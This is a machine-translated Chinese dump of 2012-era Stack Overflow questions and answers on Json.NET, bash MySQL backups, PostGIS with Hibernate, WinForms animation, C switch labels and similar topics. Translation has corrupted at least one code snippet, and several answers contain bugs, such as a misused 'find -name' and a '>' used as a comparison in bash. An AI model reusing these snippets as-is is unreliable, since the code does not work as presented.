> 赞同：0
> 
> 时间：2012-08-31T13:00:27.627

您的代码没有任何问题：

```
FB.api('/me/feed', 'post',
        { message: content },
        function(response) {        
           if (!response || response.error) {            
               alert('Error : ' + response.error);
           } else {
               alert('Post ID: ' + response.id);            
           }
        }
); 
```

只需确保您已通过身份验证并正确调用您的函数 shareWithFacebook。

# doctrine-orm - 强制学说使用联合查询来加载实体

> ID：12215176
> 
> 赞同：1
> 
> 时间：2012-08-31T12:14:56.543
> 
> 标签：doctrine-orm, eager-loading

我有一个具有许多相关实体的实体，如下所示：

```
Authorizable(one Authorization(many Role, many Acl))
User < Authorizable(
    many Profile < Authorizable
) 
```

加载用户实体并解析角色和 acls 大约需要 15 个查询，我想将其减少到最低限度（理想情况下是一个）。

该`fetch="EAGER"`选项似乎没有使用连接查询。

# c# - 如何反序列化包含无效字段名称的 JSON 对象

> ID：12215181
> 
> 赞同：16
> 
> 时间：2012-08-31T12:15:16.623
> 
> 标签：c#, .net, json, json.net

我有一个具有以下结构的 JSON 请求：

```
"formats":  {
        "flash_embed": "http://a3.vikiassets.com/assets/vikiplayer-922746a667cfd38137a7e45df6ba1b95.swf?auto_play=true&language_codes=en&media_id=74965&partner=16&source=api_v3",
        "m3u8": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965/ios.m3u8",
        "res-150p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_mp4cell_150.mp4",
        "res-240p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_240p.mp4",
        "res-270p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_270p.mp4",
        "res-360p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_360p.mp4",
        "res-480p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_480p.mp4",
        "res-720p": "http://wpc.354a.edgecastcdn.net/00354A/videos/encoded/74965_720p.mp4"
      }
    } 
```

现在 res-150p，在 C# 中表示无效名称，如果我给它取另一个名称，那么在去理想化时我没有得到任何值，这在 res-150p 中为空。

**编辑：** [Serializable] `MoviesListRootObject`是包含`Response`然后`Response`包含的根对象`Formats`

```
public class MoviesListRootObject
{
    public int count { get; set; }
    public Pagination pagination { get; set; }
    public List<Response> response { get; set; }
}

[Serializable]
public class Response
{
    public int id { get; set; }
    public int channel_id { get; set; }
    public string title { get; set; }
    public string title_language { get; set; }
    public string description { get; set; }
    public string description_language { get; set; }
    public string created_at { get; set; }
    public string uri { get; set; }
    public string web_uri { get; set; }
    public List<object> genres { get; set; }
    public string origin_country { get; set; }
    public string image { get; set; }
    public Subtitles subtitles { get; set; }
    public Formats formats { get; set; }
}

[Serializable]
public class Formats
{
    public string flash_embed { get; set; }
    public string m3u8 { get; set; }
    public string __invalid_name__res150p { get; set; }
    public string __invalid_name__res240p { get; set; }
    public string __invalid_name__res270p { get; set; }
    public string __invalid_name__res360p { get; set; }
    public string __invalid_name__res480p { get; set; }
    public string __invalid_name__res720p { get; set; }
    public string __invalid_name__flv480p { get; set; }
    public string __invalid_name__flv360p { get; set; }
    public string __invalid_name__flv270p { get; set; }
    public string __invalid_name__flvvp6360p { get; set; }
    public string __invalid_name__flvvp6270p { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-31T12:23:56.753

您必须使用属性来装饰您的`Formats`属性，`JsonProperty`以告诉它如果名称不完全匹配会发生什么：

```
partial class Formats
{
    [JsonProperty("res-150p")]
    public string __invalid_name__res150p {get; set;}
} 
```

另请参阅[使用 JsonConvert.DeserializeObject 将 Json 反序列化为 C# POCO 类](https://stackoverflow.com/questions/11126242/using-jsonconvert-deserializeobject-to-deserialize-json-to-a-c-sharp-poco-class)

# php - API 请求增加了网站上的访问次数

> ID：12215191
> 
> 赞同：0
> 
> 时间：2012-08-31T12:15:54.220
> 
> 标签：php

我通过它的uri作为（php）使用Pagespeed api，

```
https://www.googleapis.com/pagespeedonline/v1/runPagespeed?url=" . urlencode($pageurl) . "&pp=1&key=" . $key . "&strategy=desktop 
```

但是，当我对网站的更多页面执行相同操作时，页面访问次数会根据发出的请求数增加。

有什么方法可以让我使用相同的方法，但访问次数无法注册？

当我看到我网站的实时谷歌分析数据时，我才知道访问次数是以“谷歌公司”的名义注册的。

请帮忙。这很紧急。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:20:10.533

您可以从客户端 IP（通过 whois 查找）或用户代理判断它是否是 Google（和大多数其他机器人）。

# c - 将库路径导出到 LD_LIBRARY_PATH 和在链接时使用 -L 标志有什么区别？

> ID：12215195
> 
> 赞同：0
> 
> 时间：2012-08-31T12:16:15.930
> 
> 标签：c, linker, shared-libraries

进一步说明我的情况。我知道当您使用动态库时，您需要将库路径导出到 LD_LIBRARY_PATH，以便可执行文件在运行时找到这些库。如果我不这样做，就会出现一个错误，即找不到共享库。

现在，如果我添加以下链接器标志“-L/path/to/library/-lthelibrary.so”，我可以运行我的可执行文件，而无需将库路径导出到 LD_LIBRARY_PATH。

为什么是这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T15:10:48.597

首先，您通常*不需要*设置`LD_LIBRARY_PATH`运行二进制文件。加载程序使用此环境变量来查找*其他*位置，`.so`以便在执行二进制文件时查找要加载的文件。

您*需要*设置`LD_LIBRARY_PATH`您的二进制`.so`文件是否引用了一个或多个在编译时所在位置不可用的文件。如果任何直接引用的`.so`文件依赖于在创建文件时不可用的东西，也需要它`.so`。

使用该`ldd`命令检查二进制文件中的依赖信息，以便更清楚地了解创建二进制文件时链接器保存的内容。

# bash - 使用 bash 脚本备份过去 10 天的 MySQL

> ID：12215197
> 
> 赞同：0
> 
> 时间：2012-08-31T12:16:21.080
> 
> 标签：bash

以下是在 linux 服务器上的 MYSql 数据库上安排的脚本。以下是使用 bash 脚本的代码

```
#!/bin/bash
# MySQL backup script
# Last update: 20090504
#

MHOST=localhost
MUSER=backup
MPASS=OwBPimRc
BACKUPDIR="/mnt/backup"

########################################################################

MYSQL="$(which mysql)"
MYSQLDUMP="$(which mysqldump)"
GZIP="$(which gzip)"

DBPREFIX="$(hostname -s).mysqldb"

echo "Run MySQL backup"
DBS="$($MYSQL -u $MUSER -h $MHOST -p$MPASS -Bse 'show databases')"
for db in $DBS
do
  FILE=${BACKUPDIR}/${DBPREFIX}.${db}.gz
  $MYSQLDUMP --no-tablespaces --skip-lock-tables -u $MUSER -h $MHOST -p$MPASS $db | $GZIP -9 > $FILE
done 
```

但我想像 1 一样自定义这个过程。在上面的 bash 脚本的帮助下，我想存储 laste 10 数据库备份请建议 bash 脚本命令来做同样的事情..

最好的问候阿文德

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:33:56.040

像这样的东西应该工作：

```
MHOST=localhost
MUSER=backup
MPASS=OwBPimRc
BACKUPDIR="/mnt/backup"

MYSQL="$(which mysql)"
MYSQLDUMP="$(which mysqldump)"
GZIP="$(which gzip)"

DBPREFIX="$(hostname -s).mysqldb"

echo "Run MySQL backup"
DBS="$($MYSQL -u $MUSER -h $MHOST -p$MPASS -Bse 'show databases')"
for db in $DBS
do
    FILE=${BACKUPDIR}/${DBPREFIX}.${db}.`date +%Y%m%d`.gz
    $MYSQLDUMP --no-tablespaces --skip-lock-tables -u $MUSER -h $MHOST -p$MPASS $db | $GZIP -9 > $FILE
done 

find  -name "${BACKUPDIR}/${DBPREFIX}*" -type f -mtime +10 -exec rm -f '{}' ';' 
```

基本思想是使用文件名中的日期来获取每天不同的数据库备份。在最后一行中，您可以删除所有超过 10 天的文件，只保留 10 个最近的备份。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:42:47.670

jOnes 的解决方案是合理的。这是另一种选择：不理会脚本，并使用“ [logrotate](http://www.linuxcommand.org/man_pages/logrotate8.html) ”来处理修剪。在你的`/etc/logrotate.conf`，你会放这样的东西：

```
 /mnt/backup/*.mysqldb {
       daily
       rotate 10
       missingok
       nocompress
   } 
```

查看`man logrotate`以确认哪些选项最适合您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-19T10:58:56.223

也许我有点晚了，因为这个问题已经 3 岁了，但我想我可以为 jOnes 脚本添加更多功能。我需要一个类似的脚本，但由于它可以一天运行多次，“旋转”部分对我来说效果不佳。

此外，我认为 OP 需要一种方法来仅保留每个数据库的最后“n”个备份，而 jOnes 版本保留最后“n”个备份文件（因此，如果您的服务器中有 11 个数据库，则只有前 10 个将是保留）。

这是我的版本：

```
MHOST=localhost
MUSER=backup
MPASS=OwBPimRc
BACKUPDIR="/mnt/backup"
MAXBACKUPS=10

MYSQL="$(which mysql)"
MYSQLDUMP="$(which mysqldump)"
GZIP="$(which gzip)"

DBPREFIX="$(hostname -s).mysqldb"

echo "Run MySQL backup"
DBS="$($MYSQL -u $MUSER -h $MHOST -p$MPASS -Bse 'show databases')"
for db in $DBS
do
    FILE=${BACKUPDIR}/${DBPREFIX}.${db}.`date +%Y%m%d%H%M%S`.gz
    $MYSQLDUMP --no-tablespaces --skip-lock-tables -u $MUSER -h $MHOST -p$MPASS $db | $GZIP -9 > $FILE

    TOTBACKUPS=$[`ls -l ${BACKUPDIR}/${DBPREFIX}.${db}* | wc -l` - 1]
    if [ $TOTBACKUPS > $MAXBACKUPS ]
    then
        TBREMOVED=$[TOTBACKUPS - MAXBACKUPS + 1]
        REMLIST=`ls -ctr ${BACKUPDIR}/${DBPREFIX}.${db}*  | head -n ${TBREMOVED}`
        for i in $REMLIST
        do
            rm -rf $i
        done
    fi    

done 
```

# c# - 如何使用 c# 使用 AnimateWindow 函数的滑动效果显示和隐藏表单？

> ID：12215198
> 
> 赞同：2
> 
> 时间：2012-08-31T12:16:30.460
> 
> 标签：c#, winforms

我正在为我的应用程序使用 Windows 窗体。我正在单击面板加载另一个表单。现在我想展示打开和关闭表单的滑动效果。通过重载表单的 OnLoad 事件，我可以在表单从右到左打开时添加负滑动效果。但我无法使用[AnimateWindow](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632669.aspx)函数隐藏具有正面幻灯片效果的表单。有没有办法做到这一点？

这是我用来显示表格的内容：

```
protected override void OnLoad(System.EventArgs e)
{
  NativeMethods.AnimateWindow(this.Handle, 500, 
                  AW_ACTIVATE | AW_SLIDE | AW_HOR_NEGATIVE);

  base.OnLoad(e);    
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-02T04:26:13.273

使用您现有的模式 - OnClosing + AW_HIDE 反过来。

```
protected override void OnClosing(CancelEventArgs e)
{
   AnimateWindow(this.Handle, 500, AW_ACTIVATE | AW_SLIDE | AW_HOR_NEGATIVE | AW_HIDE);

   base.OnClosing(e);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:19:17.947

为什么不简单地使用[Form.Location](http://msdn.microsoft.com/en-us/library/ms159414.aspx)属性。

增加或减少它的相对值来达到你想要的滑动动画效果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T13:36:48.590

[这个](http://code.google.com/p/dot-net-transitions/)库也许可以做你想做的事。

来自站点的示例代码，在您的情况下，可以放置在`Closing`事件中。

```
Transition t = new Transition(new TransitionType_EaseInEaseOut(2000));
t.add(pictureBox1, "Left", 300);
t.add(pictureBox1, "Top", 200);
t.run(); 
```

完成动画后，您可以使用该`TransitionCompletedEvent`事件来隐藏表单。`Opacity`（或者您可以为表单的属性设置动画）

```
public event EventHandler<Args> TransitionCompletedEvent; 
```

# node.js - 从 HTTP 服务器到 TCP 服务器的数据传输

> ID：12215202
> 
> 赞同：1
> 
> 时间：2012-08-31T12:16:55.340
> 
> 标签：node.js, socket.io

我正在做一个项目，其中我有一个连接到节点 TCP 服务器的 .Net 客户端。该 TCP 服务器又需要从另一个节点 HTTP 服务器接收数据。所以，这个 HTTP 服务器正在接收一些数据，它需要将它转发到 TCP 服务器。然后 TCP 服务器需要将它广播到它的所有 .Net 客户端。我被数据传输部分困住了（尝试使用套接字，但对它不太自信）。

比如说，HTTP 服务器定义为：

var httpServer = http.createServer(函数(req,res){

```
 res.writeHead(200, { 'Content-type': 'text/html' });
     var parsed = url.parse(req.url, true);
         output = parsed.query.id; 
```

}).listen(http_PORT);

其中变量“输出”是根据从第三个服务器发送的 URL 设计的。因此，我需要将此变量“输出”传递给在其他端口上运行的 TCP 服务器。

任何帮助，将不胜感激。

问候，阿比纳什。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:25:47.303

为此，您可以将 WCF 与 TCP 绑定一起使用。Http 页面将 ping WCF 服务。

# jquery - 单击另一个元素时不要失去焦点

> ID：12215211
> 
> 赞同：2
> 
> 时间：2012-08-31T12:17:20.693
> 
> 标签：jquery, focus, contenteditable

我正在为一个项目编写一个小型“就地编辑器”，但在保持焦点和模糊方面遇到了两个问题。我做了一个小提琴来更好地解释我的问题：

[http://jsfiddle.net/distractedBySquirrels/ufbtC/](http://jsfiddle.net/distractedBySquirrels/ufbtC/)

(1) 在元素内部单击时`contenteditable`，会出现一个小工具栏。单击工具栏时，当前正在编辑的元素会在短时间内失去焦点。有没有办法绕过它？（这实际上是一个用户体验问题）

(2) 工具栏应在 时消失`blur`。但这会导致工具栏不起作用。如果您单击工具栏上的某些内容，`blur`则会发生事件......当用户单击工具栏时不模糊的（有点）最佳做法是什么？

提前致谢，

塞巴斯蒂安

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:04:27.967

解决方案非常简单......只需添加一个超时来“保护菜单”。更新了小提琴。

```
 protect: function (e) {
        e.preventDefault()
        return setTimeout(300)
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:50:51.983

您遇到了严重的问题:) maaany 之一，正在通往体面的所见即所得编辑器的路上。

在 CKEditor 中，我们通过以下方式解决了它：

1.  [focusManager](https://github.com/ckeditor/ckeditor-dev/blob/master/core/focusmanager.js) - 首先我们注册作为编辑器 UI 一部分的元素。其次，我们监听这些元素的模糊/焦点事件。第三，我们在模糊事件之后等待一段时间，因为焦点可能会在它之后被触发。第四，我们触发我们的自定义触发/模糊事件（在编辑器实例上，而不是在 DOM 元素上），工具栏之类的东西会在这些事件上监听。

2.  第二部分，我相信我们在 CKEditor 4 beta 中跳过了，将选择标记保持在可编辑状态。这是因为在大多数浏览器中，选择（甚至是视觉上的）都保持在可编辑状态，即使在单击工具栏后也是如此。也许那是因为我们使用了一些特殊的属性/JS 代码来防止在那里移动选择 - 我不知道，不幸的是。

3.  最后一件事是将选择锁定为可编辑。当您将焦点移到工具栏时，它不应该丢失，我相信 IE 和 Opera 在这里失败了。所以我们有特殊的方法`CKEDITOR.dom.selection`来锁定和恢复选择。它们由`focus/blur`可编辑的侦听器使用。

# spring - PostGIS 几何保存：“遇到无效的字节序标志值。”

> ID：12215212
> 
> 赞同：16
> 
> 时间：2012-08-31T12:17:24.870
> 
> 标签：spring, hibernate, geometry, endianness, jts

我有一个 Spring Roo + Hibernate 项目，它从客户端应用程序获取 JTS 知名文本 (WKT) 字符串输入，将其转换为 JTS Geometry 对象，然后尝试将其写入 PostGIS 数据库。我[在 JDBC 连接和类型](https://stackoverflow.com/questions/12156130/hibernate-spatial-no-dialect-mapping-for-jdbc-type-3000/)方面遇到了一些问题，但这些问题似乎已通过以下方式解决：

```
@Column(columnDefinition = "Geometry", nullable = true) 
private Geometry centerPoint; 
```

并且转换确实：

```
Geometry geom = new WKTReader(new GeometryFactory(new PrecisionModel(), 4326)).read(source); 
```

但是现在当 Hibernate 尝试将我的 Geometry 对象写入数据库时​​，我得到一个错误：

```
2012-08-31 21:44:14,096 [tomcat-http--18] ERROR org.hibernate.util.JDBCExceptionReporter - Batch entry 0 insert into land_use (center_point, version, id) values ('<stream of 1152 bytes>', '0', '1') was aborted.  Call getNextException to see the cause.
2012-08-31 21:44:14,096 [tomcat-http--18] ERROR org.hibernate.util.JDBCExceptionReporter - ERROR: Invalid endian flag value encountered. 
```

[很明显，该错误与二进制表示有关，该表示可能是作为具有某种字节顺序](http://edndoc.esri.com/arcsde/9.0/general_topics/wkb_representation.htm)的众所周知的二进制 (WKB) 生成的。然而，由于 Hibernate 隐藏了所有的持久性，我真的无法判断事情的发展方向。

几天来我一直在与几何学的东西作斗争，关于这些错误的信息很少，所以有人有什么好主意吗？我可以在某处（Hibernate 或 PostGIS）指定字节顺序，或者以不同的格式（WKT）存储吗？

**编辑：**我还应该提到我正在使用最新的一切，这通常似乎是兼容的：

*   春天 3.1.1，Roo 1.2.1
*   休眠 3.6.9
*   休眠空间 4.0-M1
*   1.12
*   PostgreSQL 9.1
*   postgis-jdbc 1.5.3（不是最新的，但[推荐用于 hibernate-spatial](http://www.hibernatespatial.org/dependencies.html)，从源代码编译）
*   postgis-jdbc 2.0.1（刚刚尝试了这个来匹配安装PostgreSQL的版本，同样的问题）

[Hibernate Spatial 4 教程](http://www.hibernatespatial.org/tutorial-hs4.html)建议我将属性注释为：

```
@Type(type="org.hibernate.spatial.GeometryType")
private Geometry centerPoint; 
```

...但是当我这样做时，我得到[了另一个错误](https://stackoverflow.com/questions/12156130/hibernate-spatial-no-dialect-mapping-for-jdbc-type-3000/)，当前注释解决了这个错误。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2018-07-06T07:14:25.550

我解决了这个问题，添加到“application.properties”这一行：

```
spring.jpa.properties.hibernate.dialect=org.hibernate.spatial.dialect.postgis.PostgisDialect 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-31T17:42:35.783

解决方案似乎如下：
`@Column`使用 JPA 注释将字段映射到所需的列，
`@Type`以使用方言指定 Hibernate 映射。

```
@Column(columnDefinition = "Geometry", nullable = true) 
@Type(type = "org.hibernate.spatial.GeometryType")
public Point centerPoint; 
```

您可以在 hibernate.cfg.xml 文件中添加 Hibernate 属性以查看 db 请求，并尝试使用基于文本的编辑器（如带有“UTF-8”/“ANSI”/“其他字符集”的 Notepad++）捕获字符串编码问题

```
<!--hibernate.cfg.xml -->
<property name="show_sql">true</property>
<property name="format_sql">true</property>
<property name="use_sql_comments">true</property> 
```

要添加休眠属性，您将拥有一个包含以下内容的 hibernate.cfg.xml 文件。不要复制/粘贴它，因为它是面向 MySQL 的。只要看看我在哪里插入了我之前唤起的属性。

```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE hibernate-configuration PUBLIC
 "-//Hibernate/Hibernate Configuration DTD 3.0//EN"
 "http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd">
 <hibernate-configuration>
      <session-factory>
           <property name="hibernate.bytecode.use_reflection_optimizer">true</property>
           <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
           <property name="hibernate.connection.password">db-password</property>
           <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/db-name</property>
           <property name="hibernate.connection.username">db-username</property>
           <property name="hibernate.default_entity_mode">pojo</property>
           <property name="hibernate.dialect">org.hibernate.dialect.MySQL5InnoDBDialect</property>
           <property name="hibernate.format_sql">true</property>
           <property name="hibernate.search.autoregister_listeners">false</property>
           **<property name="hibernate.show_sql">true</property>**
           <property name="hibernate.use_sql_comments">false</property>

           <mapping ressource="...." />
           <!-- other hbm.xml mappings below... -->

      </session-factory>
 </hibernate-configuration> 
```

记录所有 sql 的另一种方法是在 log4j.properties 文件中添加特定于包的属性：

```
log4j.logger.org.hibernate.SQL=DEBUG
log4j.logger.org.hibernate.type=TRACE 
```

祝你好运！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-06-05T09:04:42.193

piladooo 的解决方案适用于 spring boot 2.0.3、hibernate/spatial 5.2.17.Final、Postgres 9.5。

在我的例子中，实体中的列被定义为 @Column(name = "geometry") private Geometry geometry;

并在数据库中作为“几何”类型（以避免休眠自动生成的字节茶类型）

首先，我通过添加columnDefinition =“geometry”解决了“遇到的无效字节序标志值”，但之后休眠将通过“Schema-validation：在表[my_shema.my_geometry_table]中的列[geometry]中遇到错误的列类型进行模式验证；发现[geometry (Types#OTHER)]，但期待 [bytea (Types#VARBINARY)]"

添加 spring.jpa.properties.hibernate.dialect=org.hibernate.spatial.dialect.postgis.PostgisDialect 后它终于起作用了。ColumnDefinition 现在也是多余的

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-01T07:49:10.610

另请参见[http://trac.osgeo.org/postgis/ticket/1830](http://trac.osgeo.org/postgis/ticket/1830)在 Postgresql 9xx 和 Postgis 2xx 出现的时候出现了一个问题，在使用 postgres 实用程序 pgsql2shp 时导致了相同的“无效的字节序标志”错误。可以通过删除旧版本的库 libpq.so 来修复它，因为这是由于 Postgres 更改了 bytea 的默认行为。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-02-19T16:33:09.140

在与给定问题进行了一些斗争之后，这里有一些步骤可以帮助我解决它。首先我应该提到我正在使用 WildFly 17 服务器、PostgreSQL 12 和 PostGIS 3.0.0。现在我认为在这个问题上很重要的步骤：

制作`jboss-deployment-structure.xml`文件`META-INF`（如果你没有的话），并排除 WildFly 自带的休眠

```
<jboss-deployment-structure>
    <deployment>
        <exclusions>
            <module name="org.hibernate" />
        </exclusions>
    </deployment>
</jboss-deployment-structure> 
```

在您`pom.xml`添加依赖项

```
<dependency>
    <groupId>org.hibernate</groupId>
        <artifactId>hibernate-core</artifactId>
    <version>5.4.12.Final</version>
</dependency> 
```

和

```
<dependency>
    <groupId>org.hibernate</groupId>
        <artifactId>hibernate-spatial</artifactId>
    <version>5.4.12.Final</version>
</dependency> 
```

确保休眠核心和休眠空间具有相同的版本（使用您喜欢的任何版本）。

你`persistence.xml`应该有财产

```
<property name="hibernate.dialect" value="org.hibernate.spatial.dialect.postgis.PostgisDialect"/> 
```

最后，我认为这不是很重要，但我`org.locationtech.jts`在 Java 中用于几何。

我希望我没有跳过任何重要的事情，并且这些是必需的步骤。可能还有其他东西，但是尝试不同的解决方案已经过去了很多小时，而且我可能忘记包含一些依赖项/属性。答案基于个人经验，因此请随时发表评论，证明我错了或扩大答案。无论如何，我希望有人会发现这个答案很有用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-09-02T02:07:01.763

我让它与以下配置一起工作。我正在使用 Spring Boot 2.5.1、PostGIS 和 hibernate-spatial 5.4.32.Final。几个关键点：

1.  我使用的 Point 类是 org.locationtech.jts.geom.Point
2.  您不需要特殊的注释。这是我的实体类。

实体：

```
@Enity public class Vehicle {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    private String name;    

    private Point location;
} 
```

同样在 application.properties 中，我使用

```
spring.jpa.database-platform=org.hibernate.spatial.dialect.postgis.PostgisPG95Dialect 
```

然后在服务类中，我可以通过如下调用将对象保存到数据库中。

```
public Vehicle createVehicle(String name, Double longitude, Double latitude) {
    GeometryFactory geometryFactory = new GeometryFactory(new PrecisionModel(), 4326);
        var point = geometryFactory.createPoint(new Coordinate(longitude, latitude));

        var vehicle = new Vehicle(name, point);      
        return vehicleRepository.save(vehicle);
} 
```

# c - C switch 语句中的随机标签不会导致错误

> ID：12215218
> 
> 赞同：3
> 
> 时间：2012-08-31T12:17:41.330
> 
> 标签：c, switch-statement

> **可能重复：**
> [切换条件下的默认情况](https://stackoverflow.com/questions/11315330/default-case-in-a-switch-condition)

我可以编译这段代码而不会遇到任何错误。我认为应该有一个错误，因为`assadfsd`在 switch 语句中。

为什么编译不会失败？

```
#include <stdio.h>

int main(void)
{
    int choice =0;
    scanf("%d",&choice);

    switch(choice)
    {
        case 1 :
            printf("Case 1\n");
            break;                           
        assadfsd :
           printf("Error\n");                                 
    }  

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T12:19:11.967

它被称为[标签](http://publib.boulder.ibm.com/infocenter/iadthelp/v7r1/index.jsp?topic=/com.ibm.etools.iseries.langref.doc/as400clr02.htm)

例如

```
 start:
     /*statements*/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:20:08.440

该`switch`语句的语法是：

```
switch ( expression ) statement 
```

所以你可以放任何你想要的陈述而不是“陈述”。这里你使用了一个标签，它是 C 标准允许的。所以你的编译器应该编译代码没有错误。

例如，您可以使用该标签 using`goto`语句。

```
#include <stdio.h>

int main(void)
{
    int choice = 1;
    goto assadfsd;

    switch (choice) {
    case 1:
        printf("Case 1\n");
        break;
    assadfsd:
        printf("Error\n");
    }

    return 0;
} 
```

# ipad - 如何使用“下一步”在 iPad 上选择复选框（香草 html）？

> ID：12215220
> 
> 赞同：5
> 
> 时间：2012-08-31T12:17:52.443
> 
> 标签：ipad, html, safari, checkbox

### 编码

这是我的香草 html，没什么花哨的，只是一个表单，然后是一些内容，然后是另一个表单：

```
<form>

    <legend>Form #1</legend>

    <fieldset>

        <p>
            <label for="myInput">Tap in the box &gt;&gt;</label>
            <input type="text" id="myInput" />
        </p>

        <p>
            <label for="mySelect">Boselecta</label>
            <select id="mySelect">
                <option value="" selected="selected">Please select something...</option>
                <option value="proper">Proper</option>
                <option value="bo">Bo</option>
                <option value="i">I</option>
                <option value="tell">Tell</option>
                <option value="thee">Thee</option>
            </select>
        </p>

        <p>
            <label for="myCheckbox"> 
                <input type="text" id="myCheckbox" /> Check yoself before you wreck yoself      
            </label>    
        </p>

    </fieldset>

    <p>
        <input type="submit" value="Submit" />
    </p>

</form>

<p>
    Shu' thi gob. Ee by gum bloomin' 'eck wacken thi sen up be reet eeh. Nobbut a lad. Ah'll gi' thee a thick ear big girl's blouse any rooad tintintin nay lad. Ah'll gi' thi summat to rooer abaht face like a slapped arse. Eeh be reet bobbar tell thi summat for nowt where there's muck there's brass michael palin. Ey up. Tintintin soft southern pansy. Ah'll gi' thee a thick ear. That's champion be reet how much soft southern pansy be reet what's that when it's at ooam. What's that when it's at ooam t'foot o' our stairs face like a slapped arse will 'e 'eckerslike breadcake. Bloomin' 'eck. By 'eck by 'eck bloomin' 'eck. Bloomin' 'eck mardy bum nobbut a lad t'foot o' our stairs a pint 'o mild nobbut a lad. Big girl's blouse ey up nah then shurrup.
</p>

<form>

    <legend>Form #2</legend>

    <fieldset>

    <p>
        <label for="someField1">Field #1</label>
        <input type="text" id="someField1" />
    </p>

    <p>
        <label for="someField2">Field #2</label>
        <input type="text" id="someField2" />
    </p>

    </fieldset>

    <p>
        <input type="submit" value="Submit" />
    </p>

</form> 
```

### 工作示例

我还有一个简单的例子，你可以在这里试试：

[http://dabblet.com/gist/3551784](http://dabblet.com/gist/3551784)

### 问题

**在您的 iPad**上，按照以下说明进行操作：

1.  转到上面的网址。
2.  点击第一个表单上的第一个框，但不要输入任何内容，让键盘显示。
3.  点击键盘上的“下一步”，这应该带你进入选择，这应该再次显示选项，但不要选择任何东西。
4.  再次点击“下一步”，所以现在你应该已经从选择跳转到第二个表单的第一个字段了。

为什么“下一步”按钮不跳到第一个表单上的复选框？它是连续的，我们没有使用任何花哨的东西，但焦点转移到第二个表单的下一个输入。

我尝试过的事情（没有区别）：

*   更改复选框的 HTML，使其成为标签和输入
*   添加`tabindex`属性

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T01:42:39.453

不幸的是，这是“WAD”（按设计工作）。在 iOS 中，“下一个”和“上一个”按钮不适用于复选框。原因可能只是没有一种足够直观的键盘方式来处理复选框。

将其添加到 Apple 功能中。

# java - Heroku 上的 Java 7 支持

> ID：12215223
> 
> 赞同：1
> 
> 时间：2012-08-31T12:18:05.743
> 
> 标签：java, heroku, java-7

如何让 Java 7 在 Heroku 上运行？某处有构建包吗？

我正在查看默认的 Heroku buildpack，但不知道如何打开 Java 7：[https ://github.com/heroku/heroku-buildpack-java](https://github.com/heroku/heroku-buildpack-java)

干杯，欧文

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-01T06:10:03.557

将 system.properties 文件添加到您的项目中，设置 java.runtime.version=1.7，并将构建包设置为使用您提到的 github URL。更多信息在这里：[https ://gist.github.com/1b0a97fd1883ce752ce7](https://gist.github.com/1b0a97fd1883ce752ce7)

我们刚刚公开了这个功能，所以文档还没有更新。

# c# - 设置文件访问规则

> ID：12215224
> 
> 赞同：5
> 
> 时间：2012-08-31T12:18:05.667
> 
> 标签：c#, .net

以下功能适用于 windows XP，现在我在 windows 7 上尝试它返回 IdentityNotMappedException 错误有什么问题？我还将应用程序请求的执行级别更改为管理员。

```
private static void file_accessdeny(string fileName)
{
    try
    {
        System.Security.AccessControl.FileSecurity accessdeny = System.IO.File.GetAccessControl(fileName);
        accessdeny.SetAccessRule(new System.Security.AccessControl.FileSystemAccessRule("Everyone", System.Security.AccessControl.FileSystemRights.FullControl, System.Security.AccessControl.AccessControlType.Deny));
        System.IO.File.SetAccessControl(fileName, accessdeny);
    }
    catch (System.Exception E)
    {
        Console.WriteLine(E.Message);
        System.Windows.Forms.MessageBox.Show(E.Message, "access deny");
    }
} 
```

错误：**System.Security.Principal.IdentityNotMappedException：无法翻译部分或全部身份引用**

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-31T12:59:37.257

在您的代码中尝试此操作：

```
accessdeny.SetAccessRule(
   new System.Security.AccessControl.FileSystemAccessRule(
   new SecurityIdentifier(WellKnownSidType.WorldSid, null),
   System.Security.AccessControl.FileSystemRights.FullControl,
   System.Security.AccessControl.AccessControlType.Deny)); 
```

错误消息显示“无法翻译” - 这是 Windows 告诉您，当它试图为“每个人”组（即翻译）查找 SID 时......它无法通过该名称找到它。

原因之一是当您在不同的语言环境下运行 Windows 时。例如，在德语中，该组被称为“Jeder”。

# asp.net-mvc-3 - 如何从 MVC3 模型中的文件列表中删除记录？

> ID：12215226
> 
> 赞同：0
> 
> 时间：2012-08-31T12:18:09.897
> 
> 标签：asp.net-mvc-3

